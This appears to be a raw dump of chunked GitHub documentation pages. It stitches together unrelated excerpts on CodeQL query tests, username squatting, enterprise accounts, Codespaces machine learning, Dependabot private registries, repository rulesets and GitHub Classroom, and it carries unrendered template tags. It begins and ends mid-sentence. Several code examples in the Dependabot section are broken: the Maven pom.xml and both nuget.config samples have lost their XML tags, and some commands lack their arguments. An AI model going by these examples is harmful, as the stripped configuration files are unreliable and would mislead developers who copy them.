code files stored in this {% data variables.product.prodname_codeql %} pack. For more information, see \"AUTOTITLE.\"\n\nYou may find it useful to look at the way query tests are organized in the {% data variables.product.prodname_codeql %} repository. Each language has a `src` directory, `ql//ql/src`, that contains libraries and queries for analyzing codebases. Alongside the `src` directory, there is a `test` directory with tests for\nthese libraries and queries.\n\nEach `test` directory is configured as a test {% data variables.product.prodname_codeql %} pack with two subdirectories:\n\n- `query-tests` a series of subdirectories with tests for queries stored in th", "Y2h1bmtfMV9pbmRleF84NzA=": "e `src` directory. Each subdirectory contains test code and a QL reference file that specifies the query to test.\n- `library-tests` a series of subdirectories with tests for QL library files. Each subdirectory contains test code and queries that were written as unit tests for a library.\n\nAfter creating the `qlpack.yml` file, you need to make sure that all of the dependencies are downloaded and available to the CLI. Do this by running the following command in the same directory as the `qlpack.yml` file:\n\n```shell\ncodeql pack install\n```\n\nThis will generate a `codeql-pack.lock.yml` file that specifies all of the transitive dependencies required to run queries in this pack. This file should be checked in to source control.\n\n\n\nSetting up the test files for a query\n\nFor each query you want to test, you should create a sub-directory in the test {% data variables.product.prodname_codeql %} pack.\nThen add the following files to the subdirectory before you run the test command:\n\n- A query reference file (`.qlref` file) defining the location of the query to test. The location is defined relative to the root of the {% data variables.product.prodname_codeql %} pack that contains the query. Usually, this is a {% data variables.product.prodname_codeql %} pack specified in the `dependencies` block of the test pack. For more information, see \"AUTOTITLE.\"\n\n   You do not need to add a query reference file if the query you want to test is stored in the test directory, but it is generally good practice to store queries separately from tests. The only exception is unit tests for QL libraries, which tend to be stored in test packs, separate from queries that generate alerts or paths.\n\n- The example code you want to run your query against. This should consist of one or more files containing examples of the code the query is designed to identify.\n\nYou can also define the results you expect to see when you run the query against\nthe example code, by creating a file with the extension `.expected`. Alternatively, you can leave the test comm", "Y2h1bmtfMl9pbmRleF84NzA=": "and to create the `.expected` file for you.\n\nFor an example showing how to create and test a query, see the example below.\n\n{% note %}\n\n**Note:** Your `.ql`, `.qlref`, and `.expected` files must have consistent names:\n\n- If you want to directly specify the `.ql` file itself in the test command, it must have the same base name as the corresponding `.expected` file. For example, if the query is `MyJavaQuery.ql`, the expected results file must be `MyJavaQuery.expected`.\n\n- If you want to specify a `.qlref` file in the command, it must have the same base name as the corresponding `.expected` file, but the query itself may have a different name.\n\n- The names of the example code files don\u2019t have to be consistent with the other test files. All example code files found next to the `.qlref` (or `.ql`) file and in any subdirectories will be used to create a test database. Therefore, for simplicity, we recommend you don\u2019t save test files in directories that are ancestors of each other.\n\n{% endnote %}\n\n\n\nRunning `codeql test run`\n\n{% data variables.product.prodname_codeql %} query tests are executed by running the following command:\n\n```shell\ncodeql test run \n```\n\nThe `` argument can be one or more of the following:\n\n- Path to a `.ql` file.\n- Path to a `.qlref` file that references a `.ql` file.\n- Path to a directory that will be searched recursively for `.ql` and `.qlref` files.\n\nYou can also specify:\n\n- `--threads:` optionally, the number of threads to use when running queries. The default option is `1`. You can specify more threads to speed up query execution. Specifying `0` matches the number of threads to the number of logical processors.\n\nFor full details of all the options you can use when testing queries, see \"AUTOTITLE.\"\n\n\n\nExample\n\nThe following example shows you how to set up a test for a query that searches\nJava code for `if` statements that have empty `then` blocks. It includes\nsteps to add the custom query and corresponding test files to separate {% data variables.product.prodname_codeql %} packs\noutside your c", "Y2h1bmtfM19pbmRleF84NzA=": "heckout of the {% data variables.product.prodname_codeql %} repository. This ensures when you update the\n{% data variables.product.prodname_codeql %} libraries, or check out a different branch, you won\u2019t overwrite your\ncustom queries and tests.\n\n\n\nPrepare a query and test files\n\n1. Develop the query. For example, the following simple query finds empty `then`\nblocks in Java code:\n\n   ```shell\n   import java\n\n   from IfStmt ifstmt\n   where ifstmt.getThen() instanceof EmptyStmt\n   select ifstmt, \"This if statement has an empty then.\"\n   ```\n\n1. Save the query to a file named `EmptyThen.ql` in a directory with your\nother custom queries. For example, `custom-queries/java/queries/EmptyThen.ql`.\n\n1. If you haven\u2019t already added your custom queries to a {% data variables.product.prodname_codeql %} pack, create a {% data variables.product.prodname_codeql %} pack now. For example, if your custom Java queries are stored in `custom-queries/java/queries`, add a `qlpack.yml` file with the following contents to `custom-queries/java/queries`:\n\n   ```yaml\n   name: my-custom-queries\n   dependencies:\n     codeql/java-queries: \"*\"\n   ```\n\n   For more information about {% data variables.product.prodname_codeql %} packs, see \"AUTOTITLE.\"\n\n1. Create a {% data variables.product.prodname_codeql %} pack for your Java tests by adding a `qlpack.yml` file with the following contents to `custom-queries/java/tests`, updating the `dependencies` to match the name of your {% data variables.product.prodname_codeql %} pack of custom queries:\n\n   {% data reusables.codeql-cli.test-qlpack %}\n\n1. Run `codeql pack install` in the root of the test directory. This generates a `codeql-pack.lock.yml` file that specifies all of the transitive dependencies required to run queries in this pack.\n\n1. Within the Java test pack, create a directory to contain the test files\nassociated with `EmptyThen.ql`. For example, `custom-queries/java/tests/EmptyThen`.\n\n1. In the new directory, create `EmptyThen.qlref` to define the location of `EmptyThen.ql`. The path to the q", "Y2h1bmtfNF9pbmRleF84NzA=": "uery must be specified relative to the root of\nthe {% data variables.product.prodname_codeql %} pack that contains the query. In this case, the query is in the\ntop level directory of the {% data variables.product.prodname_codeql %} pack named `my-custom-queries`,\nwhich is declared as a dependency for `my-query-tests`. Therefore, `EmptyThen.qlref` should simply contain `EmptyThen.ql`.\n\n1. Create a code snippet to test. The following Java code contains an empty `if` statement on the third line. Save it in `custom-queries/java/tests/EmptyThen/Test.java`.\n\n   ```java\n   class Test {\n     public void problem(String arg) {\n       if (arg.isEmpty())\n         ;\n       {\n         System.out.println(\"Empty argument\");\n       }\n     }\n\n     public void good(String arg) {\n       if (arg.isEmpty()) {\n         System.out.println(\"Empty argument\");\n       }\n     }\n   }\n   ```\n\n\n\nExecute the test\n\nTo execute the test, move into the `custom-queries` directory and run `codeql\ntest run java/tests/EmptyThen`.\n\nWhen the test runs, it:\n\n1. Finds one test in the `EmptyThen` directory.\n\n1. Extracts a {% data variables.product.prodname_codeql %} database from the `.java` files stored in the `EmptyThen` directory.\n\n1. Compiles the query referenced by the `EmptyThen.qlref` file.\n\n   If this step fails, it\u2019s because the CLI can\u2019t find your custom {% data variables.product.prodname_codeql %} pack. Re-run the command and specify the location of your custom {% data variables.product.prodname_codeql %} pack, for example:\n\n   `codeql test run --search-path=java java/tests/EmptyThen`\n\n   For information about saving the search path as part of your configuration, see \"AUTOTITLE.\"\n\n1. Executes the test by running the query and generating an `EmptyThen.actual` results file.\n\n1. Checks for an `EmptyThen.expected` file to compare with the `.actual` results file.\n\n1. Reports the results of the test \u2014 in this case, a failure: `0 tests passed; 1 tests failed:`. The test failed because we haven\u2019t yet added a file with the expected results of the query.\n\n\n", "Y2h1bmtfNV9pbmRleF84NzA=": "\nView the query test output\n\n{% data variables.product.prodname_codeql %} generates the following files in the `EmptyThen` directory:\n\n- `EmptyThen.actual`, a file that contains the actual results generated by the\nquery.\n- `EmptyThen.testproj`, a test database that you can load into {% data variables.product.prodname_vscode_shortname %} and use to debug failing tests. When tests complete successfully, this database is deleted in a housekeeping step. You can override this step by running `test run` with the `--keep-databases` option.\n\nIn this case, the failure was expected and is easy to fix. If you open the `EmptyThen.actual` file, you can see the results of the test:\n\n```shell\n\n| Test.java:3:5:3:22 | stmt | This if statement has an empty then. |\n\n```\n\nThis file contains a table, with a column for the location of the result,\nalong with separate columns for each part of the `select` clause the query outputs.\nSince the results are what we expected, we can update the file extension to define\nthis as the expected result for this test (`EmptyThen.expected`).\n\nIf you rerun the test now, the output will be similar but it will finish by reporting: `All 1 tests passed.`.\n\nIf the results of the query change, for example, if you revise the `select` statement for the query, the test will fail. For failed results, the CLI output includes a unified diff of the `EmptyThen.expected` and `EmptyThen.actual` files.\nThis information may be sufficient to debug trivial test failures.\n\nFor failures that are harder to debug, you can import `EmptyThen.testproj`\ninto {% data variables.product.prodname_codeql %} for {% data variables.product.prodname_vscode_shortname %}, execute `EmptyThen.ql`, and view the results in the\n`Test.java` example code. For more information, see \"Analyzing your projects\" in the {% data variables.product.prodname_codeql %} for {% data variables.product.prodname_vscode_shortname %} help.\n\n\n\nFurther reading\n\n- \"{% data variables.product.prodname_codeql %} queries\"\n- \"Testing {% data variables.product.prodname_codeq", "Y2h1bmtfNl9pbmRleF84NzA=": "l %} queries in {% data variables.product.prodname_vscode %}.\"\n\n", "Y2h1bmtfMF9pbmRleF8yMDYy": "\n\nWhat if the username I want is already taken?\n\nKeep in mind that not all activity on GitHub is publicly visible; accounts with no visible activity may be in active use.\n\nIf the username you want has already been claimed, consider other names or unique variations. Using a number, hyphen, or an alternative spelling might help you identify a desirable username that's still available.\n\n\n\nTrademark Policy\n\nIf you believe someone's account is violating your trademark rights, you can find more information about making a trademark complaint on our Trademark Policy page.\n\n\n\nName Squatting Policy\n\nGitHub prohibits account name squatting, and account names may not be reserved or inactively held for future use. Accounts violating this name squatting policy may be removed or renamed without notice. Attempts to sell, buy, or solicit other forms of payment in exchange for account names are prohibited and may result in permanent account suspension.\n\n", "Y2h1bmtfMF9pbmRleF83MDc=": "\n\nAbout enterprise accounts\n\nAn enterprise account allows your client to manage and enforce policies for multiple organizations. For more information, see \"AUTOTITLE.\"\n\nTo access an enterprise account, each member must sign into their own personal account. Enterprise members can have different roles, including owner and billing manager:\n\n- Owners have complete administrative access to an enterprise.\n- Billing managers can only manage billing settings, and cannot access enterprise resources.\n\nFor more information, see \"AUTOTITLE.\"\n\nAlternatively, you can set up a single organization for your client. For more information, see \"AUTOTITLE.\"\n\n\n\nPayments and pricing for enterprise accounts\n\nWe don't provide quotes for pricing. You can see our published pricing on our pricing page. We do not provide discounts for procurement companies or for renewal orders.\n\nWe accept payment in US dollars, although end users may be located anywhere in the world.\n\nWe accept payment by credit card and PayPal. We don't accept payment by purchase order or invoice.\n\nFor easier and more efficient purchasing, we recommend that procurement companies set up yearly billing for their clients' enterprise accounts.\n\n", "Y2h1bmtfMF9pbmRleF85NzI=": "\n\nIntroduction\n\nThis guide introduces you to machine learning with {% data variables.product.prodname_github_codespaces %}. You\u2019ll build a simple image classifier, learn about some of the tools that come preinstalled in {% data variables.product.prodname_github_codespaces %}, and find out how to open your codespace in JupyterLab.\n\n\n\nBuilding a simple image classifier\n\nWe'll use a Jupyter notebook to build a simple image classifier.\n\nJupyter notebooks are sets of cells that you can execute one after another. The notebook we'll use includes a number of cells that build an image classifier using PyTorch. Each cell is a different phase of that process: download a dataset, set up a neural network, train a model, and then test that model.\n\nWe'll run all of the cells, in sequence, to perform all phases of building the image classifier. When we do this Jupyter saves the output back into the notebook so that you can examine the results.\n\n\n\nCreating a codespace\n\n1. Go to the github/codespaces-jupyter template repository.\n{% data reusables.codespaces.use-this-template %}\n\nA codespace for this template will open in a web-based version of {% data variables.product.prodname_vscode %}.\n\n\n\nOpening the image classifier notebook\n\nThe default container image that's used by {% data variables.product.prodname_github_codespaces %} includes a set of machine learning libraries that are preinstalled in your codespace. For example, Numpy, pandas, SciPy, Matplotlib, seaborn, scikit-learn, Keras, PyTorch, Requests, and Plotly. For more information about the default image, see \"AUTOTITLE\" and the devcontainers/images repository].\n\n1. In the {% data variables.product.prodname_vscode_shortname %} editor, close any \"Get Started\" tabs that are displayed.\n1. Open the `notebooks/image-classifier.ipynb` notebook file.\n\n\n\nBuilding the image classifier\n\nThe image classifier notebook contains all the code you need to download a dataset, train a neural network, and evaluate its performance.\n\n1. Click **Run All** to execute all of the notebook\u2019s cells.\n", "Y2h1bmtfMV9pbmRleF85NzI=": "\n   !Screenshot of the top of the editor tab for the \"image-classifier.ipynb\" file. A cursor hovers over a button labeled \"Run All.\"\n\n1. If you are prompted to choose a kernel source, select **Python Environments**, then select the version of Python at the recommended location.\n\n   !Screenshot of the \"Select a Python Environment\" dropdown. The first option in the list of Python versions is labeled \"Recommended.\"\n\n1. Scroll down to view the output of each cell.\n\n   !Screenshot of the cell in the editor, with the header \"Step 3: Train the network and save model.\"\n\n\n\nOpening your codespace in JupyterLab\n\nYou can open your codespace in JupyterLab from the \"Your codespaces\" page at github.com/codespaces, or by using {% data variables.product.prodname_cli %}. For more information, see \"AUTOTITLE.\"\n\n{% data reusables.codespaces.jupyterlab-installed-in-codespace %}\n\n\n\nConfiguring NVIDIA CUDA for your codespace\n\n{% note %}\n\n**Note**: This section only applies to customers who can create codespaces on machines that use a GPU. The ability to choose a machine type that uses a GPU was offered to selected customers during a trial period. This option is not generally available.\n\n{% endnote %}\n\nSome software requires you to install NVIDIA CUDA to use your codespace\u2019s GPU. Where this is the case, you can create your own custom configuration, by using a `devcontainer.json` file, and specify that CUDA should be installed. For more information on creating a custom configuration, see \"AUTOTITLE.\"\n\nFor full details of the script that's run when you add the `nvidia-cuda` feature, see the devcontainers/features repository.\n\n1. Within the codespace, open the `.devcontainer/devcontainer.json` file in the editor.\n1. Add a top-level `features` object with the following contents:\n\n   ```json copy\n     \"features\": {\n       \"ghcr.io/devcontainers/features/nvidia-cuda:1\": {\n         \"installCudnn\": true\n       }\n     }\n   ```\n\n   For more information about the `features` object, see the development containers specification.\n\n   If you are using", "Y2h1bmtfMl9pbmRleF85NzI=": " the `devcontainer.json` file from the image classifier repository you created for this tutorial, your `devcontainer.json` file will now look like this:\n\n   ```json\n   {\n     \"customizations\": {\n       \"vscode\": {\n         \"extensions\": [\n           \"ms-python.python\",\n           \"ms-toolsai.jupyter\"\n         ]\n       }\n     },\n     \"features\": {\n       \"ghcr.io/devcontainers/features/nvidia-cuda:1\": {\n         \"installCudnn\": true\n       }\n     }\n   }\n   ```\n\n1. Save the change.\n{% data reusables.codespaces.rebuild-command %}\n   The codespace container will be rebuilt. This will take several minutes. When the rebuild is complete the codespace is automatically reopened.\n1. Publish your change to a repository so that CUDA will be installed in any new codespaces you create from this repository in future. For more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF84OTM=": "\n\nAbout configuring {% data variables.product.prodname_dependabot %} to only access private registries\n\n{% data reusables.dependabot.private-registry-support %} For more information about private registry support and configuration, see \"AUTOTITLE.\" {% data reusables.dependabot.advanced-private-registry-config-link %}\n\nYou can configure {% data variables.product.prodname_dependabot %} to access _only_ private registries by removing calls to public registries. This can only be configured for the ecosystems listed in this article.\n\n{% ifversion dependabot-ghes-no-public-internet %}\n\n{% note %}\n\n**Note:** Before you remove access to public registries from your configuration for {% data variables.product.prodname_dependabot_updates %}, check that your site administrator has set up the {% data variables.product.prodname_dependabot %} runners with access to the private registries you need. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n\n{% endif %}\n\n\n\nBundler\n\nTo configure the Bundler ecosystem to only access private registries, you can set `replaces-base` as `true` in the `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\nThe Bundler ecosystem additionally requires a `Gemfile` file with the private registry URL to be checked into the repository.\n\n```yaml\n\n\nExample Gemfile\n\n source \"https://private_registry_url\"\n ```\n\n\n\nDocker\n\nTo configure the Docker ecosystem to only access private registries, you can use these configuration methods.\n\n**Option 1**\n\nDefine the private registry configuration in a `dependabot.yml` file without `replaces-base`. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Remove `replaces-base: true` from the configuration file.\n\n{% endnote %}\n\n```yaml\nversion: 2\nregistries:\n  azuretestregistry: # Define access for a private registry\n    type: docker-registry\n    url: firewallregistrydep.azurecr.io\n    username: firewallregistrydep\n    password: {% raw %}${{ secrets.AZUREHUB_PASSWORD }}{% endraw %}\n```\n\nIn the `Dockerfile` file, add the image name in the format of `IMAG", "Y2h1bmtfMV9pbmRleF84OTM=": "E[:TAG]`, where `IMAGE` consists of your username and the name of the repository.\n\n```yaml\n FROM firewallregistrydep.azurecr.io/myreg/ubuntu:22.04\n```\n\n**Option 2**\n\nSet `replaces-base` as `true` in the `dependabot.yml` file. For more information, see \"AUTOTITLE.\" The registry configured with the `replaces-base` can be used as a mirror or a pull through cache. For further details, see Registry as a pull through cache in the Docker documentation.\n\n\n\nGradle\n\nTo configure the Gradle ecosystem to only access private registries, you can use these configuration methods.\n\nDefine the private registry configuration in a `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note**: Remove replaces-base: true from the configuration file.\n\n{% endnote %}\n\nAdditionally, you also need to specify the private registry URL in the `repositories` section of the `build.gradle` file.\n\n```groovy\n\n\nExample build.gradle file\n\nrepositories {\n    maven {\n        url \"https://private_registry_url\"\n    }\n}\n```\n\n\n\nMaven\n\nTo configure the Maven ecosystem to only access private registries, you can use these configuration methods.\n\n**Option 1**\n\nSet `replaces-base` as `true` in the `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n**Option 2**\n\nUse only the private registry URL in the `pom.xml` file.\n\n   ```xml\n   \n   ...\n    \n     \n       central\n       your custom repo\n       https://private_registry_url\n    \n   ...\n   \n   ```\n\n\n\nNode\n\n\n\nnpm\n\nTo configure the npm ecosystem to only access private registries, you can use these configuration methods.\n\n**Option 1**\n\nDefine the private registry configuration in a `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Remove `replaces-base: true` from the configuration file.\n\n{% endnote %}\n\nThe npm ecosystem additionally requires a `.npmrc` file with the private registry URL to be checked into the repository.\n\n   ```yaml\n    registry=https://private_registry_url\n   ```\n\n**Option 2**\n\nIf there is no global registry defined in an `.npmr", "Y2h1bmtfMl9pbmRleF84OTM=": "c` file, you can set `replaces-base` as `true` in the `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** For scoped dependencies (`@my-org/my-dep`), {% data variables.product.prodname_dependabot %} requires that the private registry is defined in the project's `.npmrc` file. To define private registries for individual scopes, use `@myscope:registry=https://private_registry_url`.\n\n{% endnote %}\n\n\n\nYarn\n\nYarn Classic and Yarn Berry private registries are both supported by {% data variables.product.prodname_dependabot %}, but {% data variables.product.prodname_dependabot %} requires a different configuration for each ecosystem to access only private registries.\n\n\n\nYarn Classic\n\nTo configure the Yarn Classic ecosystem to only access private registries, you can use these configuration methods.\n\n**Option 1**\n\nDefine the private registry configuration in a `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Delete `replaces-base: true` from the configuration file.\n\n{% endnote %}\n\nTo ensure the private registry is listed as the dependency source in the project's `yarn.lock` file, run `yarn install` on a machine with private registry access. Yarn should update the `resolved` field to include the private registry URL.\n\n```yaml\nencoding@^0.1.11:\n  version \"0.1.13\"\n  resolved \"https://private_registry_url/encoding/-/encoding-0.1.13.tgz#56574afdd791f54a8e9b2785c0582a2d26210fa9\"\n  integrity sha512-ETBauow1T35Y/WZMkio9jiM0Z5xjHHmJ4XmjZOq1l/dXz3lr2sRn87nJy20RupqSh1F2m3HHPSp8ShIPQJrJ3A==\n  dependencies:\n    iconv-lite \"^0.6.2\"\n```\n\n**Option 2**\n\nIf the `yarn.lock` file doesn't list the private registry as the dependency source, you can set up Yarn Classic according to the normal package manager instructions:\n   1. Define the private registry configuration in a `dependabot.yml` file\n   1. Add the registry to a `.yarnrc` file in the project root with the key registry. Alternatively run `yarn config set registry `.\n\n      ```yaml\n      registry https://private_regist", "Y2h1bmtfM19pbmRleF84OTM=": "ry_url\n      ```\n\n**Option 3**\n\nIf there is no global registry defined in a `.yarnrc` file, you can set `replaces-base` as `true` in the `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** For scoped dependencies (`@my-org/my-dep`), {% data variables.product.prodname_dependabot %} requires that the private registry is defined in the project's `.npmrc` file. To define private registries for individual scopes, use `@myscope:registry=https://private_registry_url`.\n\n{% endnote %}\n\n\n\nYarn Berry\n\nTo configure the Yarn Berry ecosystem to only access private registries, you can use these configuration methods.\n\n**Option 1**\n\nDefine the private registry configuration in a `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Delete `replaces-base: true` from the configuration file.\n\n{% endnote %}\n\nTo ensure the private registry is listed as the dependency source in the project's `yarn.lock` file, run `yarn install` on a machine with private registry access. Yarn should update the `resolved` field to include the private registry URL.\n\n{% raw %}\n\n```yaml\nencoding@^0.1.11:\n  version \"0.1.13\"\n  resolved \"https://private_registry_url/encoding/-/encoding-0.1.13.tgz#56574afdd791f54a8e9b2785c0582a2d26210fa9\"\n  integrity sha512-ETBauow1T35Y/WZMkio9jiM0Z5xjHHmJ4XmjZOq1l/dXz3lr2sRn87nJy20RupqSh1F2m3HHPSp8ShIPQJrJ3A==\n  dependencies:\n    iconv-lite \"^0.6.2\"\n```\n\n{% endraw %}\n\n**Option 2**\n\nIf the `yarn.lock` file doesn't list the private registry as the dependency source, you can set up Yarn Berry according to the normal package manager instructions:\n   1. Define the private registry configuration in a `dependabot.yml` file\n   1. Add the registry to a `.yarnrc.yml` file in the project root with the key `npmRegistryServer`. Alternatively run `yarn config set npmRegistryServer `.\n    ```\n    npmRegistryServer: \"https://private_registry_url\"\n    ```\n\n{% note %}\n\n**Note:** For scoped dependencies (`@my-org/my-dep`), {% data variables.product.prodname_dependabot %} requires t", "Y2h1bmtfNF9pbmRleF84OTM=": "hat the private registry is defined in the project's `.yarnrc` file. To define private registries for individual scopes, use `\"@myscope:registry\" \"https://private_registry_url\"`.\n\n{% endnote %}\n\n\n\nNuget\n\nTo allow the Nuget ecosystem to only access private registries, you can configure the `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\nThe Nuget ecosystem additionally requires a `nuget.config` file to be checked into the repository, with either a `` tag in `` section or a key `nuget.org` as true in the `disabledPackageSources` section of the `nuget.config` file.\n\nThis is an example of a `` tag in the `packageSources` section of the `nuget.config`.\n\n```xml\n\n\n \n   \n   \n \n\n```\n\nThis is an example of adding key `nuget.org` as true to the `disabledPackageSources` section of the `nuget.config`\n\n```xml\n\n\n  \n    \n  \n  \n    \n  \n\n```\n\nTo configure {% data variables.product.prodname_dependabot %} to access both private _and_ public feeds, view the following `dependabot.yml` example which includes the configured `public` feed under `registries`:\n\n```yaml\nversion: 2\nregistries:\n  nuget-example:\n    type: nuget-feed\n    url: https://nuget.example.com/v3/index.json\n    username: ${{ secrets.USERNAME }}\n    password: ${{ secrets.PASSWORD }}\n  public:\n    type: nuget-feed\n    url: https://api.nuget.org/v3/index.json\nupdates:\n  - package-ecosystem: nuget\n    directory: \"/\"\n    registries: \"*\"\n    schedule:\n      interval: daily\n```\n\n\n\nPython\n\nPip, Pip-compile, Pipenv, and Poetry are the four package managers that the Python ecosystem currently supports.\n\n\n\nPip\n\nTo configure the Pip ecosystem to only access private registries, you can use these configuration methods.\n\n**Option 1**\n\nDefine the private registry configuration in a `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Delete `replaces-base: true` from the configuration file.\n\n{% endnote %}\n\nAdd the private registry URL to the `[global]` section of the `pip.conf` file and check the file into the repository.\n\n   ```yaml\n   [g", "Y2h1bmtfNV9pbmRleF84OTM=": "lobal]\n   timeout = 60\n   index-url = https://private_registry_url\n   ```\n\n**Option 2**\n\nSet `replaces-base` as `true` in the `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n\n\nPip-compile\n\nTo configure the Pip-compile ecosystem to only access private registries, you can use these configuration methods.\n\n**Option 1**\n\nSet `replaces-base` as `true` in the `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n**Option 2**\n\nDefine the private registry configuration in a `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Delete `replaces-base: true` from the configuration file.\n\n{% endnote %}\n\nAdd the private registry URL to the `requirements.txt` file and check the file into the repository.\n\n```yaml\n--index-url https://private_registry_url\n```\n\n\n\nPipenv\n\nTo configure Pipenv to only access private registries, remove `replaces-base` from the `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Delete `replaces-base: true` from the configuration file.\n\n{% endnote %}\n\nAdd the private registry URL to the `[[source]]` section of the `Pipfile` file and check the file into the repository.\n\n```yaml\n[[source]]\nurl = \"https://private_registry_url\"\nverify_ssl = true\nname = \"pypi\"\n```\n\n\n\nPoetry\n\nTo configure Poetry to only access private registries, set `replaces-base` as `true` in the `dependabot.yml` file. For more information, see \"AUTOTITLE.\"\n\nAdd the private registry url to the `[[tool.poetry.source]]` section of the `pyproject.toml` file and checked it in the repository.\n\n```yaml\n[[tool.poetry.source]]\nname = \"private\"\nurl = \"https://private_registry_url\"\ndefault = true\n```\n\n", "Y2h1bmtfMF9pbmRleF8xNzMy": "\n\nAbout rulesets\n\nA ruleset is a named list of rules that applies to a repository{% ifversion repo-rules-enterprise %}, or to multiple repositories in an organization{% endif %}. You can create rulesets to control how people can interact with selected branches and tags in a repository. You can control things like who can push commits to a certain branch{% ifversion repo-rules-enterprise %} and how the commits must be formatted{% endif %}, or who can delete or rename a tag. For example, you could set up a ruleset for your repository's `feature` branch that requires signed commits and blocks force pushes for all users except repository administrators.\n\nFor each ruleset you create, you specify which branches or tags in your repository{% ifversion repo-rules-enterprise %}, or which repositories in your organization,{% endif %} the ruleset applies to. You can use `fnmatch` syntax to define a pattern to target specific {% ifversion repo-rules-enterprise %}branches, tags, and repositories{% else %}branches and tags{% endif %}. For example, you could use the pattern `releases/**/*` to target all branches in your repository whose name starts with the string `releases/`. For more information on `fnmatch` syntax, see \"AUTOTITLE.\"\n\nWhen you create a ruleset, you can allow certain users to bypass the rules in the ruleset. This can be users with a certain role, such as repository administrator, or it can be specific teams or {% data variables.product.prodname_github_apps %}.\n\nThere is a limit of 75 rulesets per repository{% ifversion repo-rules-enterprise %}, and 75 organization-wide rulesets{% endif %}.\n\n\n\nAbout rulesets, protected branches, and protected tags\n\nRulesets work alongside any branch protection rules and tag protection rules in a repository. Many of the rules you can define in rulesets are similar to protection rules, and you can start using rulesets without overriding any of your existing protection rules.\n\n{% ifversion tag-protection-rules-import %}Additionally, you can import existing tag protection rules into ", "Y2h1bmtfMV9pbmRleF8xNzMy": "repository rulesets. This will implement the same tag protections you currently have in place for your repository. For more information, see \"AUTOTITLE.\"{% endif %}\n\nRulesets have the following advantages over branch and tag protection rules.\n\n- Unlike protection rules, multiple rulesets can apply at the same time, so you can be confident that every rule targeting a branch or tag in your repository will be evaluated when someone interacts with that branch or tag. For more information, see \"About rule layering.\"\n- Rulesets have statuses, so you can easily manage which rulesets are active in a repository without needing to delete rulesets.\n- Anyone with read access to a repository can view the active rulesets for the repository. This means a developer can understand why they have hit a rule, or an auditor can check the security constraints for the repository, without requiring admin access to the repository.\n\nIn addition, for organizations on a {% data variables.product.prodname_enterprise %} plan, you can do the following things with rulesets.\n\n- Quickly set up rulesets at the organization level to target multiple repositories in your organization. For more information, see \"AUTOTITLE{% ifversion ghec %}.\"{% else %}\" in the {% data variables.product.prodname_ghe_cloud %} documentation.{% endif %}\n- Create additional rules to control the metadata of commits entering a repository, such as the commit message and the author's email address. For more information, see \"AUTOTITLE{% ifversion ghec %}.\"{% else %}\" in the {% data variables.product.prodname_ghe_cloud %} documentation.{% endif %}\n- Use an \"Evaluate\" status to test a ruleset before making it active, and use an insights page to view which user actions are being affected by rules. For more information, see \"AUTOTITLE{% ifversion ghec %}.\"{% else %}\" in the {% data variables.product.prodname_ghe_cloud %} documentation.{% endif %}\n\n\n\nAbout rule layering\n\nA ruleset does not have a priority. Instead, if multiple rulesets target the same branch or tag in a repository", "Y2h1bmtfMl9pbmRleF8xNzMy": ", the rules in each of these rulesets are aggregated. If the same rule is defined in different ways across the aggregated rulesets, the most restrictive version of the rule applies. As well as layering with each other, rulesets also layer with protection rules targeting the same branch or tag.\n\nFor example, consider the following situation for the `my-feature` branch of the `octo-org/octo-repo` repository.\n\n- An administrator of the repository has set up a ruleset targeting the `my-feature` branch. This ruleset requires signed commits, and three reviews on pull requests before they can be merged.\n- An existing branch protection rule for the `my-feature` branch requires a linear commit history, and two reviews on pull requests before they can be merged.{% ifversion repo-rules-enterprise %}\n- An administrator of the `octo-org` organization has also set up a ruleset targeting the `my-feature` branch of the `octo-repo` repository. The ruleset blocks force pushes, and requires one review on pull requests before they can be merged.{% endif %}\n\nThe rules from each source are aggregated, and all rules apply. Where multiple different versions of the same rule exist, the result is that the most restrictive version of the rule applies. Therefore, the `my-feature` branch requires signed commits and a linear commit history{% ifversion repo-rules-enterprise %}, force pushes are blocked{% endif %}, and pull requests targeting the branch will require three reviews before they can be merged.\n\n", "Y2h1bmtfMF9pbmRleF8xMjM5": "\n\nPrerequisites\n\n{% data reusables.classroom.assignments-classroom-prerequisite %}\n\n\n\nCreating the starter assignment\n\n\n\nIf there are no existing assignments in the classroom\n\n1. Sign into {% data variables.product.prodname_classroom_with_url %}.\n1. Navigate to a classroom.\n1. In the {% octicon \"repo\" aria-hidden=\"true\" %} **Assignments** tab, click  **Use starter assignment**.\n\n\n\nIf there already are existing assignments in the classroom\n\n1. Sign into {% data variables.product.prodname_classroom_with_url %}.\n1. Navigate to a classroom.\n1. In the {% octicon \"repo\" aria-hidden=\"true\" %} **Assignments** tab, click the link in the blue banner.\n\n\n\nSetting up the basics for an assignment\n\nImport the starter course into your organization, name your assignment, decide whether to assign a deadline, and choose the visibility of assignment repositories.\n\n- Prerequisites\n- Creating the starter assignment\n  - If there are no existing assignments in the classroom\n  - If there already are existing assignments in the classroom\n- Setting up the basics for an assignment\n  - Importing the assignment\n  - Naming the assignment\n  - Assigning a deadline for an assignment\n  - Choosing a visibility for assignment repositories\n- Inviting students to an assignment\n- Next steps\n- Further reading\n\n\n\nImporting the assignment\n\nTo import the Git & {% data variables.product.product_name %} starter assignment into your organization, click **Import the assignment**.\n\n\n\nNaming the assignment\n\nFor an individual assignment, {% data variables.product.prodname_classroom %} names repositories by the repository prefix and the student's {% data variables.product.product_name %} username. By default, the repository prefix is the assignment title. For example, if you name an assignment 